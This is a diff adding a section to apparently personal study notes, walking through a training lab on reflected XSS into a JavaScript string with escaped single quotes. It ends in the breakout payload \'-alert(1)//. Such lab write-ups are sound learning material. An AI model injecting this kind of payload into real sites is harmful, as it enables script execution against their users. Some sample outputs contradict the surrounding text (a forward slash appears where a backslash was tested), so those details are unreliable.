@@ -158,8 +158,67 @@ so i am useing These Script
     
     
     
+ ## 7. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
     
+  You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in JavaScript
+  
+  Try Search like
+  
+     asif'khan
+     
+ and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string. like
+ 
+      <h1>
+    0 search results for 'asif&apos;khan'
+    </h1>
     
+    <script>
+    var searchTerms = 'asif\'khan';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+    </script>
+  
+ You search asif'khan but respotion in html 'asif&apos;khan' in JavaScript respotion 'asif\'khan'; 
+ 
+ Try Search like
+ 
+     asif\khan
+     
+ and observe that your backslash doesn't get escaped like 
+   
+     <h1>
+     0 search results for 'asif/khan'
+     </h1>
+     
+     <script>
+     var searchTerms = 'asif/khan';
+     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+     </script>
+     
+ You search asif'khan but respotion in html 'asif\khan' in JavaScript respotion 'asif\khan'; 
+ 
+ Replace your input with the following payload to break out of the JavaScript string and inject an alert:
+ 
+     \'-alert(1)//
+     
+     
+     
+     
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
     
     
     
